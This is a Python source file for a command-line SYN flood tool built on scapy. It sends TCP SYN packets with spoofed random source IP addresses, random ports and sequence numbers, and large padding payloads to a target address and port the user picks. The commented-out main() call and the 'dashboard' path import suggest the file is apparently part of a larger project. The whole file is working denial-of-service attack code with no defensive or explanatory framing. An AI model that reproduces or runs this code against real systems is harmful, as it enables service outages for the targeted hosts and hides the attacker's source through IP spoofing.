#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool CMD v2.0.1

from scapy.all import *
from random import randint
from argparse import ArgumentParser
import os, sys

#Get access to the main directory of the scripts
DashboardScriptDir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(DashboardScriptDir)

#####################################UTILITY REALATED TO PRINT################################

class Background_printer:

    def __init__(self):
        self.background_HEADER = '\033[95m'
        self.backgrounf_OKBLUE = '\033[94m'
        self.background_OKCYAN = '\033[96m'
        self.background_OKGREEN = '\033[92m'
        self.background_WARNING = '\033[93m'
        self.background_FAIL = '\033[91m'
        self.background_ENDC = '\033[0m'
        self.background_BOLD = '\033[1m'
        self.background_UNDERLINE = '\033[4m'


#Create a color monitor
color_monitor = Background_printer()


def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    payload = "T" #added
    print(color_monitor.background_OKGREEN+"[*] Packets are sending ..."+color_monitor.background_ENDC)

    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = int(dstPort)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send((IP_Packet/TCP_Packet/(payload*60000)), verbose=0) #added to fragment and sent packet
        total += 1

    print(color_monitor.background_OKGREEN+"[*] Total packets sent: {}".format(str(total)), color_monitor.background_ENDC)


def main():
    parser = ArgumentParser()
    parser.add_argument('--target', '-t', help='target IP address')
    parser.add_argument('--port', '-p', help='target port number')
    parser.add_argument('--count', '-c', help='number of packets')
    parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
    parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"

    args = parser.parse_args()

    if args.target is not None:
        if args.port is not None:
            if args.count is None:
                print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
                SYN_Flood(args.target, args.port, 1)

            else:
                SYN_Flood(args.target, args.port, int(args.count))

        else:
            print('[-]Please, use --port/-p to give target\'s port!')
            print('[!]Example: -p 445')
            print('[?] -h for help')
            exit()
    else:
        print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
                           [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target IP address
  --port PORT, -p PORT  target port number
  --count COUNT, -c COUNT
                        number of packets
  --version, -v         show program's version number and exit''')
        exit()

# main()
